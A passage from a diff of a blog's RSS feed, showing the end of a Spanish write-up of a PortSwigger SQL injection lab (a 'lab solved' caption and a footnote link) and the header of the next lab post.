+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
         <title>Portswigger Academy Learning Path: SQL Injection Lab 3</title>
         <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/</link>
         <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
